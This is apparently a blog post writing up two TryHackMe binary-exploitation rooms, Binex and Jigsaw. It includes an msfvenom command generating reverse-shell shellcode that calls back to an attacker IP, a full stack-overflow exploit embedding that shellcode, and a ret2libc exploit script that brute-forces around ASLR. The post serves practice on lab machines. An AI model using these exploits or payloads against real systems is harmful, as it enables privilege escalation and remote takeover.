---
layout: post
title:  "Tryhackme Day Eight"
date:   2020-07-08 20:05:48 +0100
categories: pwn
---

Here is day eight of the 30 days of pwn challenge. Today we will be looking at some more binexp machines on TryHackMe: [Binex](https://tryhackme.com/room/binex) and [Jigsaw](https://tryhackme.com/room/jigsaw). I have no idea what sort of buffer overflow to expect from these boxes, but I will try to work through them anyway.


## Binex
In this box there is a SUID binary name "bof" that we can exploit.

This exploit is just a basic buffer overflow executing our payload from the stack. The methods used are the same as before, except this time we have a huge buffer to play with and can pick out any address we have written to (pretty much) to be able to jump to our nop slide and our shellcode.


Generating msfvenom payload:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.179 LPORT=4444 -b "\x00" -f python
```
First attempt crashed with the payload:
```
payload = nop_slide * (offset - shellcode_len - 100) + buf + address
```
My assumption for this is that there was nothing between payload and the initial rip address so I changed the payload to allow a gap of 100 A's between the payload and the initial rip address.

After this our shell is stable and we have beaten the challenge.
### Exploit Code
```
import struct

offset = 616
nop_slide = "\x90"
address = struct.pack("<Q",0x7fffffffe330)
shellcode_len = 119
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x9b\xa8\x82\x51\xd6\x2c\x53"
buf += b"\xc3\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xf1\x81\xda\xc8\xbc\x2e\x0c\xa9\x9a\xf6\x8d\x54\x9e"
buf += b"\xbb\x1b\x7a\x99\xa8\x93\x0d\xdc\x27\x50\x70\xca\xe0"
buf += b"\x0b\xb7\xbc\x3c\x09\xa9\xb1\xf0\x8d\x54\xbc\x2f\x0d"
buf += b"\x8b\x64\x66\xe8\x70\x8e\x23\x56\xb6\x6d\xc2\xb9\x09"
buf += b"\x4f\x64\xe8\xec\xf9\xc1\xec\x7e\xa5\x44\x53\x90\xd3"
buf += b"\x21\x65\x03\x81\x64\xda\x25\x94\xad\x82\x51\xd6\x2c"
buf += b"\x53\xc3"

payload = nop_slide * (offset - shellcode_len - 100) + buf + 'A' * 100 + address

print(payload)
```

## Jigsaw
In this box we have a binary named game3 that we need to exploit (it's SUID so we assumingly want to spawn a shell from this.)
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Is ASLR enabled?
```
cat /proc/sys/kernel/randomize_va_space
2
```

NX and aslr is enabled so we will need to do some kind of attack to bypass this.

From basic fuzzing we find the EIP overwrite offset to be 76
```
msf-pattern_offset -l 100 -q c5Ac
[*] Exact match at offset 76
```
Now we can start getting addresses for a ret2libc attack.

Finding libc base:
```
ldd /bin/game3
```

Finding System and exit addresses
```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```
Finding /bin/sh offset
```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

### Exploit Code
```
import struct
from subprocess import call

libc_base = 0xb75c4000
system = struct.pack("<I",0x00040310 + libc_base)
exit   = struct.pack("<I",0x00033260 + libc_base)
bin_sh = struct.pack("<I",0x00162d4c  + libc_base)

offset = "A" * 76

payload = offset + system + exit + bin_sh

# Run the payload multiple times due to aslr
i = 0
while (i < 512):
	print("Trying " + str(i))
	print(payload)
	i = i + 1
	ret = call(["/bin/game3", payload])
```

Well, I really need to start looking for another learning platform the push the knowledge forward. The past few days have been going over simple extremely simple buffer overflows (which is good revision to solidify the knowledge) and it could be more beneficial to find something more challenging (like heap! :[ ). 

I looked through the other pwn challenges on TryHackMe, but it seemed like a lot of steps to reach the pwn and it involved nothing knew from what I could tell.
